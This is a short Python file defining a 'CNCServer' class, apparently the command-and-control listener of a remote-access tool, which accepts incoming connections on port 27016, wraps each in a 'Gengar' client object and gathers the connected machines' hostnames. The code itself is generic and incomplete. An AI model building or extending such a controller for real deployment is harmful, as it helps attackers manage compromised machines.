import socket
import threading

from gengar import Gengar


class CNCServer:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    gengars = []

    def __init__(self):
        self.sock.bind(('0.0.0.0', 27016))

    def listen(self):
        self.sock.listen(1)
        print('Waiting for connections.')
        accept_worker = threading.Thread(target=self.accept)
        accept_worker.start()
    
    def accept(self):
        while True:
            conn, addr = self.sock.accept()
            print(f'Got connection from: {addr}.')
            self.control(conn)

    def control(self, conn):
        self.gengars.append(Gengar(conn))

    def close(self):
        self.sock.close()

    def fetch_hostnames(self):
        return [gengar.fetch_hostname() for gengar in self.gengars]

